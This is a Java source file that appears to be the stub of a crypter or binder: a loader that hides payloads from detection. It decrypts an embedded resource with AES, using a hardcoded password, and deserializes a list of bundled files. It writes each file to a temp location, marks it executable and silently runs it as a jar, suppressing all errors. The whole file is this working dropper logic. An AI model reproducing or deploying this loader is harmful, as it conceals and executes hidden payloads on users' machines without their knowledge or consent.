package com;

import java.awt.Desktop;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.security.MessageDigest;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Main {

    public static String ppp = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA"; //password 

    public static void main(String args[]) {
        new Main().start();
    }

    public void start() {
        try {
            List<F> listaAdjuntos = (List<F>) Main.leerObjeto(Main.a("/dat.dat"));
            if (listaAdjuntos != null) {
                ByteArrayInputStream entrada;
                File destino;
                FileOutputStream salida;
                byte[] BUFFER;
//                File rutaTemp = File.createTempFile("lsj", ".tmp");
//                rutaTemp = rutaTemp.getParentFile();
                for (F archivo : listaAdjuntos) {
                    destino = File.createTempFile("tmp", archivo.getNombre());
//                    destino = new File(rutaTemp, archivo.getNombre());
                    //entrada = new ByteArrayInputStream(Main.descomprimirGZIP(archivo.getIcono()));
                    entrada = new ByteArrayInputStream(archivo.getContenido());
                    salida = new FileOutputStream(destino);
                    BUFFER = new byte[1024];
                    int i;
                    while ((i = entrada.read(BUFFER)) > -1) {
                        salida.write(BUFFER, 0, i);
                    }
                    salida.close();
                    entrada.close();
                    destino.setExecutable(true);
                    try {
//                        Desktop.getDesktop().open(destino.getAbsoluteFile());
                        String jre = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                        String jar = " -jar ";
//                        System.out.println("se deberia ejecutar lo siguiente " + jre + jar + destino.getAbsolutePath());
                        Runtime.getRuntime().exec(new String[]{jre, jar.trim(), destino.getAbsolutePath()});
                    } catch (Exception e) {
//                        e.printStackTrace();
                    }
//                    destino.deleteOnExit();
                }
            }
        } catch (Exception ex) {
//            ex.printStackTrace();
        }
    }

    //leer objeto
    public static Object leerObjeto(InputStream stream) throws Exception, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(stream);
        Object object = in.readObject();
        in.close();
        in = null;
        return object;
    }

    //descifrar
    public static InputStream a(String name) {
        byte[] tmp = null;
        try {
            InputStream m = Main.class.getResourceAsStream(name);
            if (m == null) {
                return null;
            }
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int i;
            while ((i = m.read(buf)) > -1) {
                b.write(buf, 0, i);
            }
            b.close();
            try {
                //tmp = Util.descomprimirGZIP(d(Main.ppp, b.toByteArray()));
                tmp = descifrar(Main.ppp, b.toByteArray());
                return new ByteArrayInputStream(tmp);
            } catch (Exception e) {
                return Main.class.getResourceAsStream(name);
            }
        } catch (Exception ex) {
            return Main.class.getResourceAsStream(name);
        }
    }

    //descifrar
//    public static byte[] descifrar(String ppp, byte[] datos) {
//        try {
//            ByteArrayOutputStream out = new ByteArrayOutputStream();
//            SecretKeyFactory skf = SecretKeyFactory.getInstance(new String(new char[]{'D', 'E', 'S'}));
//            DESKeySpec kspec = new DESKeySpec(ppp.getBytes());
//            SecretKey ks = skf.generateSecret(kspec);
//            Cipher c = Cipher.getInstance(new String(new char[]{'D', 'E', 'S'}));
//            c.init(2, ks);
//            byte[] tmp = c.update(datos, 0, datos.length);
//            out.write(tmp);
//            tmp = c.doFinal();
//            out.write(tmp);
//            out.close();
//            return out.toByteArray();
//        } catch (Exception ex) {
//        }
//        return null;
//    }
    private static Cipher obtieneCipher(String contrasena, boolean paraCifrar) throws Exception {
        final MessageDigest digest = MessageDigest.getInstance("SHA");
        digest.update(contrasena.getBytes("UTF-8"));
        final SecretKeySpec key = new SecretKeySpec(digest.digest(), 0, 16, "AES");
        final Cipher aes = Cipher.getInstance("AES/ECB/PKCS5Padding");
        if (paraCifrar) {
            aes.init(Cipher.ENCRYPT_MODE, key);
        } else {
            aes.init(Cipher.DECRYPT_MODE, key);
        }
        return aes;
    }

//    public static byte[] cifrar(String contrasena, byte[] input) {
//        try {
//            ByteArrayOutputStream out = new ByteArrayOutputStream();
//            Cipher c = obtieneCipher(contrasena, true);            
//            byte[] tmp = c.update(input, 0, input.length);
//            out.write(tmp);
//            tmp = c.doFinal();
//            out.write(tmp);
//            out.close();
//            return out.toByteArray();
//        } catch (Exception ex) {
//            Logger.getLogger(AES.class.getName()).log(Level.SEVERE, null, ex);
//        }
//        return null;
//    }
    public static byte[] descifrar(String contrasena, byte[] input) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            Cipher c = obtieneCipher(contrasena, false);
            byte[] tmp = c.update(input, 0, input.length);
            out.write(tmp);
            tmp = c.doFinal();
            out.write(tmp);
            out.close();
            return out.toByteArray();
        } catch (Exception ex) {
        }
        return null;
    }
}
